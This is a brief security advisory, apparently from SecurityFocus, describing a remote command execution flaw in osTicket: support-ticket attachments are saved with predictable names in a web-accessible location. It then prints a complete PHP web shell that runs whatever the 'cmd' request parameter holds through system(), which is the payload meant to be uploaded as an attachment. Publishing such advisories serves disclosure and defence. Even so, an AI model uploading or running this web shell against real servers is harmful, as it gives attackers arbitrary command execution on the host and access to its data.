source: http://www.securityfocus.com/bid/10586/info

osTicket is reported prone to a remote command execution vulnerability. The issue is reported to present itself because attachments submitted as a part of a support ticket request are stored with a predictable name in a known web accessible location.

<?PHP
echo "<form action = ''><input type = 'text' name = 'cmd' value = '$cmd' size = '75'><BR>";
if (!$cmd)die;
system($cmd);
?>